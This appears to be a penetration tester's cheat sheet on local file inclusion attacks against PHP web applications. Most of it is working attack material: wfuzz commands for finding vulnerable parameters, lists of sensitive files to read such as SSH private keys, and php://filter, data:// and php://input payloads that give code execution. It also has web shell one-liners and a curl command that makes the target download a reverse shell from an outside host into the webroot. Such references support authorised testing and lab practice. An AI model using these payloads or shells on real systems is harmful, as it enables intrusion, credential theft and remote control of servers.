## Fuzzing LFI

```bash
# LFI fuzz with LFISuite huge wordlist
sudo wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u http://192.168.100.10/index.php?file=FUZZ -f fuzz/wfuzz-LFI-LFISuite-pathtotest-huge.txt --hc 404

# LFI fuzz with Jhaddix wordlist
sudo wfuzz -c \
  -u http://$ip/index.php?file=FUZZ \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -f fuzz/wfuzz-LFI-jhaddix.txt \
  --hc 404
```
## Parameter Fuzzing

Discover vulnerable parameters (e.g. `file`, `page`, `lang`, `id`):

```bash
# Basic parameter fuzz
sudo wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://$ip/index.php?FUZZ=/etc/passwd -f fuzz/wfuzz-burp-parameter.txt --hc 404

# With session cookie (authenticated user context)
sudo wfuzz -c -u http://$ip/index.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -f fuzz/wfuzz-burp-parameter.txt -b "PHPSESSID=sadsadasdasd" --hc 404
```
## Wordlists Reference

| Target         | Wordlist Path |
|----------------|---------------|
| Linux LFI      | `/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt` |
| Windows LFI    | `/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt` |
| Both (huge)    | `/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt` |
| Parameters     | `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt` |
| File values    | `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt` |
## Files to Target – Linux

### Credentials & Users

```
/etc/passwd
```
### SSH

```
/etc/ssh/sshd_config
../../../../home/<username>/.ssh/id_rsa
../../../../home/<username>/.ssh/id_rsa.pub
../../../../home/<username>/.ssh/authorized_keys
```

### Network

```
/etc/knockd.conf
```

### Apache (Debian / Ubuntu / Mint)

```
/etc/apache2/apache2.conf
/etc/apache2/conf-enabled/security.conf
/etc/apache2/sites-enabled/000-default.conf
```

### Apache (Arch / Fedora / CentOS / RHEL)

```
/etc/httpd/conf/httpd.conf
```

### Nginx

```
/etc/nginx/nginx.conf
```

### PHP Config

> Check `allow_url_include` — if disabled, RFI is not possible.

```
/etc/php5/apache2/php.ini
/etc/php5/apache2/php.ini%00
```
## Files to Target – Windows

### System

```
C:/WINDOWS/System32/drivers/etc/hosts
C:\WINDOWS\System32\drivers\etc\hosts
```
### IIS

```
%windir%\system32\inetsrv\UrlScan
c:\inetpub\htdocs
```
### XAMPP

```
c:\xampp\htdocs
```
## PHP Wrappers

### php://filter

Read source files as base64-encoded output:

```
php://filter/read=convert.base64-encode/resource=/etc/passwd
php://filter/read=convert.base64-encode/resource=/etc/passwd%00

http://url/index.php?page=php://filter/convert.base64-encode/resource=index.php

# Case-mixing bypass
http://url/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```
### expect://

Execute OS commands (requires `expect` extension):

```
http://127.0.0.1/fileincl/example1.php?page=expect://ls
```
### data://

Inject and execute base64-encoded PHP:

```bash
# Encode phpinfo() payload
echo '<?php phpinfo(); ?>' | base64 -w0
# → PD9waHAgcGhwaW5mbygpOyA/Pgo=

# Execute via data wrapper
http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=

# Encode command execution payload
echo '<?php passthru($_GET["cmd"]);echo "Shell done !"; ?>' | base64 -w0
# → PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

# Execute with cmd parameter
http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&cmd=ls
```

> If `Shell done !` appears in the response, code execution is confirmed.

### php://input

Send PHP payload via POST body:

```bash
# Basic command execution
curl -k -v "http://example.com/index.php?page=php://input" --data "<?php echo shell_exec('id'); ?>"

# Download and stage a reverse shell
curl -k -v "http://example.com/index.php?page=php://input" --data "<? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?>"
```

### Assertion

```
' and die(show_source('/etc/passwd')) or '
```

### PHP One-Liners

```php
# Versatile web shell (GET or POST)
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

# Minimal GET shell
<?php echo system($_GET['cmd']); ?>
```

> After confirming code execution via `phpinfo()`, check `disable_functions` and use an enabled function from: `exec`, `shell_exec`, `system`, `passthru`, `popen`.

---

## PHP Zip Wrapper

Upload a zip containing a PHP shell, then access it via the `zip://` wrapper for RCE.

- Reference: https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/

---

## References

- https://docs.veracode.com/r/fingerprinting
- https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/